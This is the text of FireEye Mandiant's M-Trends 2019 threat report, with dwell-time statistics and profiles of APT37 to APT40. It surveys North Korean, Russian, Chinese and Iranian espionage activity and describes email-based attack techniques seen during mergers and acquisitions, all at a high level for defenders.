SPECIAL REPORT | M-TRENDS 2019

Executive Summary
Over the past 10 years, we covered many different topics in our M-Trends®
reports, including a primer on the exploitation life cycle, how attackers were
hiding their activities, malware trends and case studies providing technical
details into many of the investigations we performed.
On the surface, not much has changed over the past 10 years. 2018 was much
like 2017, and 2017 like the preceding years. We continue to see large impactful
incidents, though fewer high-profile public disclosures. Extortion cases are
on the rise, assisted by cryptocurrency and other forms of non-attributable
payment. Cryptocurrencies are also directly targeted via wallets, payment
systems and miners.
The significant trends or shifts we saw in 2018 were:
• A significant increase in public attribution performed by governments.

Recent years have seen a significant increase in private sector attribution of
attack activity, but the past year saw a significant number of attacks publicly
attributed by way of indictments from the U.S., U.K., Netherlands and Germany.
Some of these were assisted by data from private sector companies such as
FireEye. Governments have not changed their operational rules of engagement,
but they are combating threats publicly through indictments.
• As more and more customers move to software as a service and cloud,

attackers are following the data. Attacks against cloud providers, telecoms, and
other organizations with access to large amounts of data have increased.

SPECIAL REPORT | M-TRENDS 2019

Several indictments
announced in 2018:

M-Trends 2019 looks at some of the latest trends
revealed through FireEye incident response
investigations by FireEye Mandiant. These include
evolving APT activity in various regions, phishing
risks during mergers and acquisitions, and some
defensive trends that we consider best practices.
We also answer the question that everyone asks:
As an industry, are we getting better at detecting
threat actors? We are quite pleased to announce
that the answer is a big yes. From October 1,
2017, to September 30, 2018, the global median
dwell time was 78 days. That means attackers are
operating for just under three months, on average,
before they are detected. That’s roughly a quarter
of the global median dwell time of 101 days in last
year’s report—a modest improvement.
It wouldn’t be M-Trends if we didn’t include a
variety of case studies to demonstrate exactly
what we saw in the field that enabled us to
provide the information in this report. This year,
we show how early identification is key by diving
into an incident involving attacker activity now
attributed to the threat group TEMP.Demon. We
also discuss an incident at a Southeast Asia-based
international telecommunications company that
started with an extortion email sent from the
CEO’s work account by an attacker.
When we launched our first M-Trends report 10
years ago, we had one primary goal—and that
hasn’t changed: to arm security teams with the
knowledge they need to defend against today’s
most often used cyber attacks, as well as lesser
seen and emerging threats.
The information in this report has been sanitized
to protect identities of victims and data.

Dwell time (days)

In 2018, 31% of the compromises Mandiant investigated had dwell times
of 30 days or less, compared to 28% of compromises in 2017. 12% of 2018
investigations had dwell times greater than 700 days, down from 21% in 2017.
We attribute the increase in compromises detected in under 30 days to more
ransomware and cryptominer engagements overall, which are detected faster.
Also, clients are generally improving data visibility through better tooling,
which allows for faster responses.

The median dwell time in the Americas decreased from 75.5 days in 2017 to
71 days in 2018. While there was a modest decrease in dwell time, the dwell
times by engagement varied in large measure. We saw an uptick in financially
motivated compromises such as ransomware and business email compromise,
which tend to have both immediate impact and immediate detection by the
targeted organization. Additionally, the decrease in dwell time can be attributed
to organizations that continually develop and improve their internal hunting
capabilities and enhanced network, endpoint and cloud-service provider visibility.

The overall dwell time of 177 days remained largely unchanged from 175 days in
2017. However, we have seen an increase in both Internal and External dwell times,
reflecting the changing trend in EMEA. Organizations, and in particular Boards, are
taking cyber security far more seriously. This has been in part driven by regulation
such as GDPR, but also due to increased recognition of the risk presented by
targeted cyber attackers.

EMEA MEDIAN DWELL TIME
CONTINUED

The underlying data shows that while many organizations are dealing with
advanced threat actors much faster than ever before, security teams are still
uncovering historical attacks. Therefore, the increased Internal and External
dwell times reflect the attention that organizations are placing on effective
security measures
The increasing gap between internal and external notification reinforces the
importance for organizations to have strong detection and remediation strategies.
External notification cannot be relied upon as a meaningful detection strategy.

The median dwell time across APAC was 204 days, indicating improvement over
the previous year’s statistic of 498 days, but more comparable to the 172 days
in 2016.
These statistics reflect an increase in more quickly detected breaches due to
compromises with near-immediate impact on organizations, although scale and
complexity of attacks also increased, which median dwell time doesn’t represent.
Notably, outlier dwell time values of more than seven years clearly indicate that the
fight against undetected compromises has not yet been won. We have observed
attacks by many known adversaries who continue to succeed with the same or
very similar TTPs as before, illustrating that targeted attackers continue to succeed
in their missions and many known threats are left unaddressed. This is also evident
by the high percentage of cyber attack victim organizations being retargeted.

SPECIAL REPORT | M-TRENDS 2019

Organizations are getting better at discovering compromises internally,
as opposed to being notified by external sources. In 2018, almost 60% of
compromises were internally detected. Though down slightly from the 62%
internal detection rate in 2017, this remains a significant improvement from
2014, when only 31% of compromises were internally detected.

Last year’s M-Trends reported that in 2017, 56% of FireEye
managed detection and response customers who were
previously Mandiant incident response clients were targets
of at least one significant attack in the past 19 months by
the same or similarly motivated attack group.
In 2018, this number has continued to climb, increasing to
64%. This data further substantiates the fact that if you’ve
been breached, you are much more likely to be targeted
again and possibly suffer another breach.

SPECIAL REPORT | M-TRENDS 2019

Newly Named
APT Groups in 2018
FireEye tracks thousands of threat actors and pays
distinct attention to state-sponsored groups who carry
out advanced persistent threat (APT) attacks. Unlike
many cyber criminals, APT attackers often pursue their
objectives over greater lengths of time, typically months
or years. They rapidly adapt to a victim organization’s
attempts to remove them from the network and frequently
target the same victim again if access is lost.

12

13

SPECIAL REPORT | M-TRENDS 2019

In 2018, FireEye promoted four attack groups from previously tracked TEMP groups to APT groups.

How a threat activity group becomes an APT group
• Newly identified clusters of “interesting” activity gathered from Mandiant Incident Response

attack surface data, technical and threat intelligence research, and proprietary methods
are tracked internally across our Knowledge Center. Our team of technical and threat
researchers, analysts and reverse engineers begin their work from known indicators and
attempt to find related indicators, activity or other data. When only a small cluster of
activity is found, we reference that activity in finished intelligence (FINTEL), which may
include data published to the FireEye Intelligence Portal and external blogs without a formal
name.
Example: “Suspected Iran-based nation-state threat actors sent spear phishing emails….”

• Some clusters develop further with, for example, sufficient or consistent reporting that

identifies their tactics, tools and procedures (TTPs). In these cases, the cluster is given a
temporary “TEMP.<xxx>” group name. For example, APT37 was previously reported as “TEMP.
Reaper” group.

• As a TEMP group becomes sufficiently mature, the actor will be assigned a formal APT or

FIN number. APT groups are nation-state actors generally focused on espionage activities.
FIN groups are highly organized criminal groups that engage in high-level financial crime
such as business email fraud and extortion activities. The methodology for naming an APT or
FIN group is identical in nature. One example of maturity is that there is enough evidence to
believe the cluster activity represents an actual group, and confidence the activity is not part
of an existing group.

14

SPECIAL REPORT | M-TRENDS 2019

APT37
February 19, 2018

APT37 (also known as “Reaper”) has likely been active since
2012 and targets public and private sectors. Although it
primarily targeted organizations in South Korea, starting
in 2017, APT37 expanded its targeting beyond the Korean
peninsula into Japan, Vietnam and the Middle East. This
expansion also revealed a wider range of targeted industry
verticals including chemicals, electronics, manufacturing,
aerospace, automotive and health care entities.

15

SPECIAL REPORT | M-TRENDS 2019

We assess that the primary mission of APT37 is covert
intelligence gathering in support of North Korea’s strategic
military, political and economic interests. This hypothesis
is based on their consistent targeting of South Korean
public and private entities and social engineering. This
group’s recently expanded scope also appears to have
direct relevance to North Korean strategic interests. North
Korean defector and human rights-related targeting
provides further evidence that APT37 conducts operations
aligned with North Korean interests. Targets including
a research fellow, advisory member, and journalist
associated with various North Korean human rights issues
and strategic organizations were victims of APT37 attacks.
A Japanese entity associated with the United Nations’
sanctions mission and human rights was also a target.

Figure 1.
APT37 TTPs across
the attack lifecycle.

In July 2018, FireEye Intelligence experts uncovered a
reunification-themed email, sent to multiple recipients,
that possessed a weaponized HWP attachment that was
likely used against South Korean government agencies. A
connection was identified by observing the use of Korean
Peninsula reunification/unification-themed email lures in
previous APT37 operations.
North Korea has repeatedly demonstrated a willingness
to leverage its cyber capabilities for a variety of purposes,
undeterred by international norms. Though it has primarily
tapped into other suspected North Korean teams to carry
out the most aggressive actions, APT37 is an additional
resource available to the regime, perhaps marked as even
more desirable for its relative obscurity. We anticipate
that APT37 will be leveraged in previously unfamiliar roles
and regions, especially as pressure continues to mount on
North Korea.

October 2, 2018

APT38 is a financially motivated group linked to North
Korean cyber espionage operators, renowned for its
attempt to steal hundreds of millions of dollars from
financial institutions through the brazen use of destructive
malware. APT38 executes sophisticated bank heists that
typically feature long planning, extended periods of
access to victim environments preceding any attempts
to steal money, fluency across mixed operating systems,
the use of custom developed tools and constant effort to
thwart investigations capped with a willingness to destroy
compromised machines.

17

SPECIAL REPORT | M-TRENDS 2019

Based on observed activity, we judge that the primary
mission of APT38 is targeting financial institutions and
manipulating inter-bank financial systems to raise large
sums of money for the North Korean regime. Increasingly
heavy and pointed international sanctions have been
levied on North Korea following the regime’s continued
weapons development and testing. The pace of APT38
activity reflects increasingly desperate efforts to steal
funds to pursue state interests, despite growing economic
pressures on the city of Pyongyang. Since 2015, APT38
has attempted to steal hundreds of millions of dollars from
financial institutions.

Based on the vast resources and networks dedicated
to compromising financial targets and stealing funds
over the last few years, we believe APT38 operations
will continue to persist. In particular, the number of
SWIFT heists thwarted in recent years, coupled with the
growing awareness for cyber security around the financial
messaging system, could drive APT38 to employ new TTPs
to obtain stolen funds—especially if North Korea’s access
to currency continues to deteriorate.

APT39
December 12, 2018

APT39 is an Iranian cyber espionage group that FireEye
intelligence experts have tracked since November 2014.
While APT39’s targeting scope is global, its activities are
concentrated in the Middle East. APT39 has prioritized the
telecommunications sector, with additional targeting of the
travel industry and supporting IT firms, as well as the hightech industry. Malware distribution data, files names and
related command and control (CnC) domains suggest that
APT39’s targeting may also extend to transportation and
government entities in Israel and Kuwait.

19

SPECIAL REPORT | M-TRENDS 2019

APT39’s focus on the telecommunications and travel
industries suggests intent to perform monitoring, tracking
or surveillance operations against specific individuals, collect
proprietary or customer data for commercial or operational
purposes that serve strategic requirements related to
national priorities, or create additional accesses and vectors
to facilitate future campaigns. Government-entity targeting
suggests a potential secondary intent to collect geopolitical
data that may benefit nation-state decision making.
Targeting data supports the belief that APT39’s key mission
is to track or monitor targets of interest, collect personal
information such as travel itineraries and gather customer
data from telecommunications firms.
APT39’s activity largely aligns with a group publicly
referred to as “Chafer.” However, there are differences
in what has been publicly reported due to the variances
in how organizations track activity. For example, some
APT39 activity has also been publicly reported as “OilRig,”
a group that loosely aligns with APT34. While APT39
and APT34 share some similarities, including malware

distribution methods, POWBAT backdoor use, infrastructure
nomenclature and targeting overlaps, we consider APT39 to
be distinct from APT34 given its use of a different POWBAT
variant. It is possible that these groups work together or
share resources at some level.
We believe APT39’s significant targeting of the
telecommunications and travel industries reflects efforts
to collect personal information on targets of interest and
customer data for the purposes of surveillance to facilitate
future operations. Telecommunications firms are attractive
targets because they store large amounts of personal and
customer information, provide access to critical infrastructure
used for communications and enable access to a wide
range of potential targets across multiple verticals. APT39’s
targeting not only represents a threat to known targeted
industries, but it extends to these organizations’ clients,
which include a wide variety of sectors and individuals on a
global scale. Considering this, we infer that APT39’s mission
is to collect personal information that satisfies Iran’s national
security priorities.

APT40

December 19, 2018

APT40 (Periscope) is a Chinese cyber espionage group that
typically targets countries strategically important to China’s
“Belt and Road Initiative.” Target countries are concentrated
in Southeast Asia or are host to global entities involved
in maritime issues, such as shipping or naval technology.
Since at least January 2013, the group has conducted
campaigns against a range of verticals including maritime
targets, defense, aviation, chemicals, research/education,
government and technology organizations. Previous FireEye
reports referred to the group as “TEMP.Periscope,” although
APT40 also incorporates the group previously dubbed
“TEMP.Jumper.”

21

SPECIAL REPORT | M-TRENDS 2019

APT40 reliably targets the engineering, transportation and
defense sectors, especially where these sectors overlap
with maritime technologies. Targeting of universities and
similar institutes conducting maritime-related research
further supports the assessment that APT40 is specifically
focused on maritime and naval issues. Although observed
targeting has been broad and cuts across multiple industries,
affected organizations generally focus on engineering and
defense. The group’s operations tend to target governmentsponsored projects and take large amounts of information
specific to such projects, including proposals, meetings,
financial data, shipping information, plans and drawings, and
raw data.
Although APT40 activity declined after the Obama-Xi
agreement in 2015, by December 2017, the group resumed
targeting U.S. entities in aircraft transportation, industrial
equipment and education. Organizations with operations in
Southeast Asia or involved in South China Sea disputes have
also been targeted by APT40.

Figure 4.
APT40 TTPs across
the attack lifecycle.

We assess with high confidence that APT40 is attributable
to Chinese cyber espionage operators based on a variety
of factors. APT40 has used Internet Protocol (IP) addresses
located in Hainan, China, as well as other locations in
mainland China. Additionally, APT40 infrastructure has
relied on the use of domain resellers with Chinese contact
information. Analysis of the operational times of the group’s
activities indicates that it is probably centered around Beijing
time (UTC +8). Further, APT40 has used malware families
observed in other Chinese cyber operations, which indicates
possible collaboration between groups.
APT40 is a moderately sophisticated cyber espionage
group that demonstrates access to significant development
resources, as well as the ability to leverage shared and
publicly available tools. Although the group has not been
observed exploiting zero-day vulnerabilities, it often
weaponizes vulnerabilities within days of public disclosure.
Since 2013, APT40 has come to leverage an enormous library
of tools and can shift operations to new targets as required.
Despite increased public attention, APT40 has remained
undeterred from conducting cyber espionage operations,
and we anticipate its operations will continue through at least
the near and medium term.

Evolution of APT
Activity by Region
In 2018, North Korea, Russia, China and Iran conducted the
most significant cyber espionage campaigns based on impact,
with operational activity touching every major region of the
globe. Targeting objectives aligned with the individual security
and economic needs of each state. Activity and primary threat
actors have evolved during 2018.

EVOLUTION OF
NORTH KOREA-NEXUS
APT ACTIVITY

North Korean cyber activity appears to closely mirror the personal
whims of the pariah state’s leadership. As a result, cyber operators linked
to North Korea have conducted a wide range of operations, including
destructive attacks, conventional espionage operations, and, most
recently, elaborate bank heists. These operator groups have developed
their capabilities rapidly, most likely indicating a deep level of investment
by the Kim regime and reflecting the asymmetrical advantage that North
Korea enjoys in cyberspace. In addition to steadily growing sophistication
and capability, these groups have also regularly conducted operations
that defy global norms in that they brazenly act for financial gain and
often destroy data. These operations continue despite North Korea’s
recent re-engagement with the international community, echoing the
regime’s unpredictability.

23

SPECIAL REPORT | M-TRENDS 2019

NORTH KOREA

2009-2011

2012-2015

2016-2018

Disruptive and destructive, early observed
North Korean cyber operations typically
pointed at the regime’s primary opponents:
South Korea and the U.S. DDoS attacks
against South Korean government offices,
the financial sector and the media industry
as well as U.S. military and defense targets
gradually escalated to file-wiping operations.
The earliest campaigns exhibited hacktivistlike characteristics including stylized political
messages and threats. This activity peaked
with the highly publicized attack on Sony
that destroyed systems and crippled dayto-day operations. The incident marked one
of the first times a nation-state-supported
operator directly targeted a corporate entity
while significantly elevating public awareness
of North Korea’s cyber capabilities.

North Korean cyber espionage activity
linked to what would become APT37
(Reaper) was first observed in 2012. In 2013,
additional cyber espionage groups were
identified, including groups FireEye refers
to as Kimsuky and APT38. Operations
conducted by these groups typically
focused on South Korea and the U.S.,
leveraging spear-phishing tactics to deliver
malware to government offices, defense
contractors and the military.

APT37 expanded the scope and
sophistication of its operations, including
leveraging zero-day vulnerabilities
and wiper malware. Most likely due
to increasing pressure from financial
sanctions, North Korea directed its cyber
groups to conduct financially motivated
operations. APT38—and other operator
groups—had been developing their
capabilities since at least 2014, but its
presence emerged publicly in 2016 when
the group conducted one of the largest
bank heists in history against Bangladesh
Bank. In the publicly reported heists alone,
APT38 has attempted to steal more than
$1.1 billion from financial institutions around
the world, mainly from developing markets.
In addition to the bank heists, APT38related activity has shifted spear-phishing
operations to target cryptocurrency
services and exchanges. Additionally,
North Korea released the WANNACRY
ransomware, indicating that North Korean
operators are seeking to raise money in
any way possible.

Both APT37 and APT38 exemplify the continued threat from North Korean
state-sponsored actors, despite the regime’s significant re-engagement with the
international community and direct talks with both South Korea and the U.S.
In early 2018, APT37 expanded the scope and sophistication of its operations,
including leveraging zero-day vulnerabilities and wiper malware. The group also
targeted individuals and organizations in Japan, Vietnam, and the Middle East
and in a wider range of verticals than previously known.
We believe North Korea continues to be under financial stress by pointed
economic sanctions, and this has motivated constant financially motivated
campaigns.
• APT38 has compromised more than 16 organizations in at least 13 different

countries, sometimes simultaneously, since at least 2014. Victimized
organizations tend to be in developing economic regions.
• Although APT38 focuses almost exclusively on the financial sector, its bank

heists are reminiscent of sophisticated espionage campaigns.
• APT38 continues to conduct phishing activity against Bitcoin and other

cryptocurrency-related financial services.
North Korean campaigns have progressed, and the operators behind them have
continued to develop their capabilities despite significant regional and global
geopolitical shifts.
The persistence and expansion of both cyber espionage and financially
motivated campaigns highlights North Korea’s reliance on its growing cyber
power, a subject that is typically overshadowed by Pyongyang’s nuclear and
regime-preserving ambitions.

EVOLUTION OF RUSSIA-NEXUS APT ACTIVITY

RUSSIA

From their early days as part of an
intelligence apparatus reluctant to depart
from traditional statecraft and operational
security, Russian APT groups have grown
from being limited observers to being
unmatched in their aggressiveness and
ability to carry out influence and intrusion
operations. Russia’s vast geopolitical
landscape, internal security concerns
and cultural distinctiveness combine to
form an APT threat environment uniquely
Russian. Russian APT threats do, however,
mirror other major powers in that they are
deployed to serve the strategic interests
of the state. For Russia, the main catalysts
have been political adversaries, national
defense, Ukraine and energy. There are also
some indicators that Russian APT actors
are prepared to carry out disruptive and
destructive attacks, and conduct internal
and external monitoring of Russian citizens.

PRE-2004

2004-2012

2013- 2016

2016-2018

Russian activity was largely
focused on government
targets.

There was limited visibility
during the initial stages of what
was likely the developmental
years of Russian APT activity.
The majority of their operations
came to light around 2007.
Russia’s three primary
teams, APT28 (Tsar), Turla
and Sandworm formed the
backbone of known Russian
intrusion activity and maintain
that influence to present day.
The early stages of Russian
APT activity focused on NATO,
Eastern Europe (government
and energy sectors) and foreign
ministries.

The beginning of this period
saw all core Russian APT
groups hitting the energy
sector, including newly
observed operators such as
TEMP.Isotope and the now
defunct Koala Team. In 2015,
APT29 (Monkey) appeared to
target Western governments,
foreign affairs and policymaking
bodies, government
contractors, universities and
possibly an international news
outlet. With the annexation of
the Crimea and Ukraine, geopolitical conflict was a major
driver during this time, leading
to late 2015 Ukraine power
outages. TEMP.Armaggedon
specialized in a mission
targeting Ukrainian national
security and law enforcement.
It is likely that forays into
information/influence
operations began circa 2015.

Over the last two years, Russian
APT activity has maintained a
constant emphasis on NATO,
Eastern Europe, Ukraine and the
energy sector. It appears that
Sandworm took on a specialized
campaign that included the
U.S. and Europe. Targeting of
U.S. and French elections were
likely a major goal. Russian
actors were also noted using
wiper attacks during the
Winter Olympics. Russian APT
campaigns have been highly
innovative in terms of social
engineering, plausible deniability
and aggressiveness. Russian
cyber espionage actors continue
to conduct brazen, global
operations against political
and international organizations
aligned with Moscow’s strategic
interest despite public exposure
and legal indictments.

27

SPECIAL REPORT | M-TRENDS 2019

RUSSIAN APT ACTIVITY IN 2018
Russian cyber espionage groups continued to conduct global operations against political and international organizations
aligned with Moscow’s strategic interests. In the second quarter of 2018, Russia-nexus espionage groups, notably the
Sandworm Team, demonstrated a renewed interest in targeting Ukrainian entities across several verticals. In the third
quarter, public exposure and legal indictments against Russian APT actors failed to deter Russian-sponsored intrusion
campaigns. Continued targeting of NATO suggest that the organization is perceived as a threat to Moscow’s security and
global ambitions. One of the more interesting aspects of Russian APT activity in 2018 was the use of destructive attacks
against select targets.
• Russian operations maintained a

broad-scope interest in a variety
of sectors and geopolitical
events. Significant activity was
conducted in relation to prominent
international events, including
the Winter Olympic games. The
primary focus has been traditional
espionage, but a focus on Ukraine
and Poland may portend future
events for 2019.
• In the second quarter of 2018,

FireEye began to see renewed
interest in Ukraine targets,
potentially signaling further
strategic and operational pushes
into the country. Targeting of
Poland in the last quarter of
the year may suggest similar
objectives.
• In the third quarter of 2018, the U.S.

Department of Justice released
an indictment against 12 Russian
intelligence officers that describes
their work in the Russian Main
Intelligence Directorate (GRU) to
compromise and leak information
from Democratic political entities
and compromise the U.S. election
infrastructure. The indictment
offered a deeper understanding
of the military intelligence

organization behind this activity,
which was attributed to GRU Units
26165 and 74455. An initial analysis
of the indictment suggests that
these GRU units correlate with
threat actors we track as APT28
(Tsar) and Sandworm Team,
respectively.
• In 2018, we revealed that Turla

Team operators were targeting
European government agencies
using newly discovered or updated
toolsets, including XTRANS
malware.
• New samples of the previously

reported WEATHERMAN dropper
and FAÇADE malware were also
examined. Turla frequently targets
government agencies, including
ministries of foreign affairs, in
NATO, EU and other countries, to
gather diplomatic and security
intelligence relevant to Russia’s
national interest.
• In the fourth quarter of 2018, Turla

Team was suspected of targeted
European energy policy and
diplomacy entities.
• During 2018, FireEye was able

to link TEMP.Veles and the Triton
framework to a Russian entity.

XTRANS malware
is a backdoor that
leverages email
messaging to receive
and execute commands
and exfiltrate data
through specifically
formatted JPEG and
PDF email attachments.
XTRANS can collect,
block, read and modify
email messages, and
leverages a Microsoft
Exchange transport
agent in parallel to
receive and process
email messages
delivered to the
Exchange server.

PRE 2004

CHINA

Early Chinese cyber espionage operations were
unsophisticated (by today’s standards), noisy,
easy to detect and targeted a wide variety
of industries with little consequence to the
attackers. Distinct groups, such as APT1, were
identifiable because of specific TTPs as well
as malware tools that could be tracked back
to sponsoring organizations or even individual
actors. Chinese espionage operations were run
by both military units and civilian organizations.
Contractors were also used, and there was
significant overlap in espionage activity from
these actors and the financially motivated
campaigns they were also operating. Chinese
cyber espionage is primarily restricted to/
focused on government targets.

2004-2013

Gradual target expansion into the defense
industrial base, then M&A targets and
commercial entities doing business in China,
up to the revealing of PLA Unit 61398 to the
world in February of 2013.

2013- 2015

Reduction in activity starts.

2015 - 2016

EVOLUTION OF CHINA-NEXUS
APT ACTIVITY
China is widely considered the most prolific sponsor of
cyber espionage operators, and more distinct clusters of
activities have been linked to Chinese sponsorship than to
any other country. However, Chinese espionage activity
and development has gone through periods of growth and
contraction, signaling shifts in China’s geopolitical positions,
economic priorities and national strategies.
China’s cyber espionage apparatus most likely came initially
out of the ruling party’s own internal security needs. In
addition to internal dissidents, these campaigns targeted
jurisdictions that Beijing considers to be integral to the
Chinese state, although it does not exercise official control
over them, such as Taiwan, Hong Kong and autonomous
regions in Western China. We believe that Chinese
espionage operators often tested new tools and TTPs
against populations in these jurisdictions before deploying
them worldwide. Recently, Chinese groups have been
targeting and monitoring elections in neighboring countries
more closely than before, suggesting a more active effort
to protect Chinese investments overseas, especially as the
country seeks to expand its global influence.

Late 2015 saw Chinese cyber espionage
activity begin to significantly decline,
especially against the U.S. Besides the widely
publicized Obama-Xi agreement to end cyberenabled intellectual property theft, the PLA
also underwent a significant reorganization
to consolidate cyber-related functions, and
the Chinese government at large shifted its
national priorities in line with the 13th Five
Year Plan (2016–2020).

2017 – 2018

Some Chinese espionage operators reemerged and renewed operations, including
APT20 and Conference Crew. Other actors
appear to have been reorganized in some
way, such as APT15 (Social Network). Cyber
espionage activities also moved away from
direct intellectual property theft (especially
targeting the West) and shifted toward
strategic espionage campaigns, especially
targeting Southeast Asia, South Asia
and Central/Western Asia. In most cases,
resurgent groups leveraged revamped TTPs
that relied on more publicly available malware
tools. During this time period, China’s Belt and
Road Initiative became a key national priority
and subsequently a driver for intrusion
campaigns likely to support successful
completion of the massive project.

30

SPECIAL REPORT | M-TRENDS 2019

CHINESE APT ACTIVITY IN 2018
Many Chinese APT groups have resumed their regular tempo after a period of reduced activity that started in
2016. These groups have re-emerged with modified TTPs and refreshed malware tools. Activity believed to be
linked to state-backed operators now appears to be relatively focused on maintaining strategic intelligence
and focusing on geopolitical developments.

• The People’s Liberation Army has had more

• Shifts in regional focus and targeting most

than a year to consolidate and reorganize
its cyber resources under their Strategic
Support Forces, and the decreased
number of distinct Chinese espionage
groups currently and actively conducting
operations is possibly reflective of more
centralized operations, but not necessarily
less overall activity.

likely reflect changing priorities shaped
by altered trade agreements, geopolitical
developments, and China’s own refocus on
regional expansion such as the Belt and
Road Initiative.

• We believe the Chinese government

temporarily curtailed activity associated
with civilian operators such as the Ministry
of State Security.
• Although re-emergent groups have

modified their TTPs, technical indicators
can still provide a link to previous activity.
For example, APT20 (Twivy) returned using
its signature malware COOKIECLOG and
CETTRA, and Conference Crew returned
using its signature malware suite of EVORA,
ELISE and EMISSARY.
• Some individual actors who were part of

dormant groups were reorganized into
new operational teams or reassigned to
existing known groups, most likely reflecting
significant and widespread restructuring of
China’s cyber espionage capability.

• Most of the re-emergent Chinese espionage

groups have become increasingly reliant
on publicly available malware, especially
BEACON and EMPIRE. Relatedly, operators
such as APT10 (Menupass) are deploying
new malware that is largely modified from
publicly available tools and enhancing
their capabilities and capacity to employ
additional malware quickly.
We believe China’s Belt and Road Initiative
(BRI), a $1 trillion strategic effort to expand
land and maritime trade routes across Asia
and parts of Africa, has become a significant
driver of Chinese cyber espionage activity.
These operations support the BRI endeavor
through the collection of business intelligence
on major projects and agreements.
Additionally, campaigns are monitoring
elections and tracking regional power shifts
that could impact Chinese investments and
BRI-related expansion activity.

IRAN

EVOLUTION OF IRAN-NEXUS
APT ACTIVITY
From nascent regional and internal
strategic interests, Iran-nexus cyber
espionage operations have evolved into
a sophisticated, cohesive intelligencegathering organization with global
ambitions and reach. Over the last
decade, Iranian APT operations have
transitioned from using social media
sites with limited focus and impact to
specialized teams capable of direct
targeting and tool development. Actors
associated with Iranian interests have
also demonstrated the ability to design
influence operations (passive, disruptive
and destructive) to shape the operational
environment in favor of the state’s
strategic imperatives.

2009-2011

2011-2014

2014-2018

Initial motivations and drivers behind
Iran’s development of a cyber espionage
capability likely originated due to perceived
global threats from the U.S. and regional
rivals such as Saudi Arabia and Israel,
as well as internal (Green Movement)
and external dissident movements. The
damage caused by the Stuxnet virus, in
conjunction with internal dissent activities
spurred by social media, pushed the regime
to make defensive and offensive cyber
warfare capabilities a priority, resulting in
the establishment of the national cyber
command in 2011.

Iran showed an increasing propensity
to adopt cyber operations as a form of
asymmetric warfare, launching campaigns
designed for retaliation (against U.S.
financial sector for sanctions), deterrence
(Shamoon), political influence and
competition. It is also suspected that
state-sponsored organizations are likely
directing, working in concert with or
paralleling independent actors (Ajax
Team). Targeting also expanded to include
the collection of adversary capabilities in
the U.S. defense industrial base sector.

Iran’s cyber capabilities grew at an
exponential rate from the observance
of APT35 (Newscaster) carrying out
rudimentary intelligence collection using
social media to the likely development/
specializing of new and currently dormant
APT teams and groups (APT33, APT34,
APT39, Beanie Team, Jafar Team, TEMP.
Lice, TEMP.Omega and TEMP.Zagros). We
also detected a shift from being reactive
to proactive with the incorporation of
strategic targeting of Europe.

its campaign activity in both scope and scale. It
remained the biggest threat to the Middle East by
hitting all major sectors. Strategic objectives clearly
extended beyond the immediate Middle East region,
as witnessed by worldwide intrusion activities that
aligned with the regime’s interests.

Iranian APT Actors

cyber espionage was leveraged to a greater extent
in state-sponsored efforts to shape and define the
global environment. In addition to saturated targeting
of the Middle East/Gulf States, Iranian APT campaigns
extended to North America, Eurasia and parts of Asia.
• Targeting trends for Iran’s 2018 activities remained

fairly constant over all four quarters of 2018, primarily
focusing on national security, finance/energy, foreign
affairs and dissident activity. Policies such as the U.S.
withdrawal from the U.S.-Iranian nuclear deal may have
been a catalyst for intrusion activity.

Conclusion
In 2018, North Korea, Russia, China and Iran posed the
greatest global cyber espionage threats worldwide.
Motivated by security and economic concerns, North
Korean operators matured in both technical and
operational sophistication. Russian cyber espionage
actors have continued to operate worldwide, targeting
political entities relevant to Russia’s strategic national
interests. Dormant Chinese espionage teams returned

and reinvented their operations, as observed during the
course of Mandiant incident response engagements.
Iran-nexus intrusion activity demonstrated an expanded
use of cyber espionage operations to collect strategic
information on national security, economics and the
internal security of their targets. Finally, open-source
tools are now used across most major APT operators,
which increases the challenge of definitive attribution.

SPECIAL REPORT | M-TRENDS 2019

Overview
In M-Trends 2012, we discussed the risk of integrating a compromised
entity into a parent organization through a merger or acquisition (M&A).
Over half a decade later, this remains a threat to organizations. During M&A
activity, numerous due diligence and integration efforts are executed under
aggressive deadlines to achieve financial and business objectives. To meet
these objectives, leadership will sometimes accept risk by moving forward
with integrating the organizations’ computer networks without fully resolving
security objectives. Despite intending to resolve incomplete or missed
objectives over a longer timeframe, these objectives are often forgotten,
reducing the security posture of the combined company. This provides
attackers an opportunity to leverage the compromise of an acquired
company to compromise the network of the acquiring company.
In 2018, FireEye Mandiant conducted investigations in the Middle East
where M&A activity allowed the compromise of the acquired company to
compromise the acquiring company’s environment. In some cases, a single
compromised email account could be leveraged to increase an attacker’s
access to the victim network.

36

SPECIAL REPORT | M-TRENDS 2019

Phishing
We observed an increase in phishing attacks where a
compromised email account was used to send phishing
emails to additional users in the organization. This is
particularly effective in M&A situations, since employees
expect communication, sometimes unsolicited, between
the organizations. Phishing emails sent within an
organization are more likely to bypass checks by email
gateways, which are often configured to inspect email
entering or leaving an organization’s network. The natural
development of relationships between individuals or
organizations means the target is more likely to trust
such content and enable macros, open attachments, and
navigate to a URL using links. Internal phishing can be used
to compromise additional user accounts, including those
with elevated privileges. We have seen this technique used
by groups including APT34, APT10 and FIN7, as well as
cyber criminal groups.

37

Bypassing Multi-Factor Authentication
Attackers also leveraged access to compromised email
accounts to bypass multi-factor authentication. Mandiant
observed bypasses of SMS-based, email-based, and
software-based security token (soft-token) multi-factor
authentication. We observed APT34 leverage access
to email to find soft-tokens distributed using email. The
risk of soft-tokens in email has only been exacerbated
by the prevalence of eDiscovery features in web- or
cloud-based email platforms, which allow sensitive
information, including soft-tokens, to be identified
across an organizations email solution.

38

SPECIAL REPORT | M-TRENDS 2019

Forwarding and Redirection
We have observed attackers using PowerShell, Exchange
Control Panel and Exchange Web Services (EWS) to
create forwarders, exports or re-direct rules, to maintain
access to email without the need to authenticate to the
environment. Establishing forwarders allows attackers
to collect email on an ongoing basis, without the need
to authenticate to the organization’s email solution.
Removing the need to authenticate reduces the likelihood
the attacker’s access to email will be discovered.
Malware Installation
In the wild, we also observed the exploitation of
vulnerabilities in Outlook configuration. The attacker
logged in and changed the Outlook homepage setting
within the victim account. The next time the victim logged
on within the corporate environment, the system was
redirected to the attacker’s webpage and compromised
with malware that provided a foothold for the attacker
inside the network. Similarly, we saw the deployment of
a .NET backdoor capable of, among other things, the
download, upload and execute functions through the
abuse of Outlook Add-Ins. This backdoor also created a
hidden folder for messages and a rule to move messages
to that folder, enabling the use of the account for further
phishing attacks invisible to the user. These vulnerabilities
have been patched by Microsoft.
Conclusion
We expect unauthorized access to email, particularly
during M&A, to remain a common source of attack for
threat actors of varying intent and sophistication. We
also expect that the TTPs will evolve with security tools
and monitoring.
Threat actors will continue to increase the effectiveness
of subsequent stages of the targeted attack lifecycle
